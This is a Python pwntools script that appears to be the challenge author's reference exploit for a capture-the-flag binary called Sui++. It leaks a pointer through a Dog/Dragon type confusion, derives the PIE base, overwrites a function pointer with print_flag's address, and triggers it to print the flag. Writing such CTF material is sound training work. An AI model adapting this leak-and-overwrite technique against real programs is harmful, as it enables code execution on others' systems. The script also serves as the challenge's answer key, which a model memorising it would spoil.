#!/usr/bin/env python3
"""Author-side exploit for the Sui++ type-confusion challenge."""

from pathlib import Path
import re

from pwn import *


context.log_level = "info"
ROOT = Path(__file__).resolve().parents[1]
BIN = ROOT / "dist" / "suipp"
FLAG_PATTERN = re.compile(rb"HOLOGY9\{[^}\r\n]+\}")


def menu(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def main():
    # The final executable is stripped. These three explicitly retained
    # dynamic symbols provide symbol offsets, not fixed runtime addresses.
    elf = ELF(str(BIN), checksec=False)

    if args.LOCAL:
        io = process(str(BIN), cwd=str(ROOT / "src"))
    else:
        host = args.HOST or "127.0.0.1"
        port = int(args.PORT or 1337)
        io = remote(host, port)

    # Adopt a Dog. Its trick pointer starts at dog_default_trick in this PIE.
    menu(io, 1)
    io.sendlineafter(b"Little animal's name: ", b"Pochi")

    # The unsafe Dragon inspector interprets Dog::trick as Dragon::breath.
    menu(io, 6)
    io.sendlineafter(b"Animal index: ", b"0")
    io.recvuntil(b"Breath pattern: ")
    leaked_pointer = int(io.recvline().strip(), 16)
    log.info("leaked dog_default_trick: %#x", leaked_pointer)

    # Subtract the leaked symbol's link-time offset to recover this run's PIE
    # base, then add the hidden print_flag offset to form its randomized address.
    pie_base = leaked_pointer - elf.sym.dog_default_trick
    flag_address = pie_base + elf.sym.print_flag
    log.info("PIE base: %#x", pie_base)
    log.info("print_flag: %#x", flag_address)

    # Rename the Dog to the harmless trainer keyword. Trainer mode accepts an
    # exact eight-byte replacement for only this Dog's trick pointer.
    menu(io, 5)
    io.sendlineafter(b"Animal index: ", b"0")
    io.sendlineafter(b"New name: ", b"suisei")
    io.sendlineafter(b"New nickname: ", b"starlight pup")
    io.recvuntil(b"New trick pointer bytes: ")
    io.send(p64(flag_address) + b"\n")

    # Dragon::fire reads the same offset and invokes the now-controlled pointer.
    menu(io, 7)
    io.sendlineafter(b"Animal index: ", b"0")
    found = io.recvregex(FLAG_PATTERN)
    print(found.decode())
    io.close()


if __name__ == "__main__":
    main()
